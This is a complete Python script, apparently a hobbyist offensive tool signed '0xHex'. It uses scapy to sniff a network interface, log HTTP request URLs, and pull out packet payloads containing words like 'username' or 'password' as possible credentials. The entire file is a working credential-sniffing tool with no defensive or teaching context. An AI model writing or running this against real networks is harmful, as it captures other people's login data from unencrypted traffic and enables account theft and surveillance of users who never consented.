#!/usr/bin/env python 

import scapy.all as scapy
from scapy.layers import http 
import argparse

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i","--interface",dest="interface",help = "Interface name for sniffing")
    options = parser.parse_args()
    if not options.interface:
        parser.error("[-] no Interface for sniffing , use --help for more information")
    return options
    
def sniff(interface):
    print("[+] ---------------------- PACKET SNIFFER By 0xHex  ---------------------- [+]")
    scapy.sniff(iface=interface , store = False , prn = process_sniffed_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
            load = str(packet[scapy.Raw].load)
            keywords = ["username","password","login","user","pass"]
            for keyword in keywords:
                if keyword.lower() in load.lower() : 
                    return load
                    
def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> "+str(url))
    login_info = get_login_info(packet)
    if login_info : 
        print("\n\n[+] Possible Username / Password >> " + login_info + "\n\n" )

options = get_arguments()
sniff(options.interface)
            
